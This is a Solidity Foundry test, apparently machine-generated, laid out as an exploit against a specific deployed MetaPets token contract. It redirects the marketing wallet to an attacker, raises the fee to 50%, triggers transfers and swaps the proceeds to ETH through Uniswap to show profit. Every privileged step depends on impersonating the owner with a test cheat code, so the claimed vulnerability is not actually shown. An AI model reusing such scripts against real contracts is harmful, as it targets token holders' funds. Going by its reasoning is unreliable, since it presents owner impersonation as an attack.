pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the token to access uniswapV2Router
interface IMetaPets {
    function owner() external view returns (address);
    function setMarketingWallet(address _add) external;
    function setMarketingFeePercent(uint256 marketingFee) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (address);
}

// Interface for the router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d;
    address attacker = address(this);
    // No additional state variables needed

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract instance
        IMetaPets target = IMetaPets(TARGET);

        // Get the current owner
        address owner = target.owner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(address(target), "MetaPets Token");
        vm.label(attacker, "Attacker");

        // Give attacker some initial ETH for gas and to buy tokens if needed
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get contract instance
        IMetaPets target = IMetaPets(TARGET);
        address owner = target.owner();

        // Step 2: Impersonate owner and set marketing wallet to attacker
        vm.prank(owner);
        target.setMarketingWallet(attacker);

        // Step 3: Optionally increase marketing fee for more profit
        vm.prank(owner);
        target.setMarketingFeePercent(50); // Set to 50% for maximum profit

        // Step 4: Get some tokens to make a transfer
        // The owner has all tokens initially. We need to get some tokens to transfer.
        // Let's impersonate owner to transfer some tokens to a dummy address first
        address dummy = address(0x123);
        vm.prank(owner);
        target.transfer(dummy, 1000 * 10**9); // Transfer some tokens to dummy

        // Step 5: Make a transfer from dummy to trigger marketing fee
        // The dummy address needs to approve the transfer if we use transferFrom,
        // but we can just use transfer since dummy has tokens
        vm.prank(dummy);
        target.transfer(address(0x456), 100 * 10**9); // This should send marketing fee to attacker

        // Step 6: Check attacker's token balance
        uint256 attackerTokenBalance = target.balanceOf(attacker);
        console.log("Attacker token balance:", attackerTokenBalance);

        // Step 7: Sell tokens for ETH
        // First, approve router to spend attacker's tokens
        address router = target.uniswapV2Router();
        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(router);

        vm.prank(attacker);
        target.approve(router, attackerTokenBalance);

        // Then swap tokens for ETH
        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = uniswapRouter.WETH();

        uint256 ethBefore = address(attacker).balance;
        vm.prank(attacker);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalance,
            0, // accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        uint256 ethAfter = address(attacker).balance;
        console.log("ETH before:", ethBefore);
        console.log("ETH after:", ethAfter);
        console.log("Profit:", ethAfter - ethBefore);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // No helper functions needed
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

